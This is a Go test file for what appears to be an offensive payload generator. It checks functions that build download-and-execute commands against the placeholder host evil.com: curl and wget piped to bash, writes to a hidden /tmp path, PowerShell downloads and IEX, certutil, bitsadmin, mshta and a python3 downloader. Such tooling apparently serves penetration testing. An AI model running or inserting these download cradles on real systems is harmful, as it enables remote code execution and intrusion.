package payload

import (
	"strings"
	"testing"
)

func TestCurl(t *testing.T) {
	got := Curl("http://evil.com/shell", "")
	if !strings.Contains(got, "curl") || !strings.Contains(got, "/tmp/.p") {
		t.Errorf("Curl default = %q", got)
	}

	got = Curl("http://evil.com/shell", "/opt/payload")
	if !strings.Contains(got, "/opt/payload") {
		t.Errorf("Curl custom path = %q", got)
	}
}

func TestWget(t *testing.T) {
	got := Wget("http://evil.com/shell", "")
	if !strings.Contains(got, "wget") || !strings.Contains(got, "/tmp/.p") {
		t.Errorf("Wget default = %q", got)
	}
}

func TestCurlPipe(t *testing.T) {
	got := CurlPipe("http://evil.com/script.sh")
	if got != "curl -s http://evil.com/script.sh | bash" {
		t.Errorf("CurlPipe = %q", got)
	}
}

func TestWgetPipe(t *testing.T) {
	got := WgetPipe("http://evil.com/script.sh")
	if got != "wget -qO- http://evil.com/script.sh | bash" {
		t.Errorf("WgetPipe = %q", got)
	}
}

func TestPowerShellDownload(t *testing.T) {
	got := PowerShellDownload("http://evil.com/p.exe", "")
	if !strings.Contains(got, "powershell") || !strings.Contains(got, `C:\Windows\Temp\p.exe`) {
		t.Errorf("PowerShellDownload default = %q", got)
	}
}

func TestPowerShellIEX(t *testing.T) {
	got := PowerShellIEX("http://evil.com/script.ps1")
	if !strings.Contains(got, "IEX") {
		t.Errorf("PowerShellIEX = %q", got)
	}
}

func TestCertutil(t *testing.T) {
	got := Certutil("http://evil.com/p.exe", "")
	if !strings.Contains(got, "certutil") {
		t.Errorf("Certutil = %q", got)
	}
}

func TestBitsadmin(t *testing.T) {
	got := Bitsadmin("http://evil.com/p.exe", "")
	if !strings.Contains(got, "bitsadmin") {
		t.Errorf("Bitsadmin = %q", got)
	}
}

func TestMshta(t *testing.T) {
	got := Mshta("http://evil.com/payload.hta")
	if got != "mshta http://evil.com/payload.hta" {
		t.Errorf("Mshta = %q", got)
	}
}

func TestPythonDownload(t *testing.T) {
	got := PythonDownload("http://evil.com/p", "")
	if !strings.Contains(got, "python3") || !strings.Contains(got, "/tmp/.p") {
		t.Errorf("PythonDownload = %q", got)
	}
}
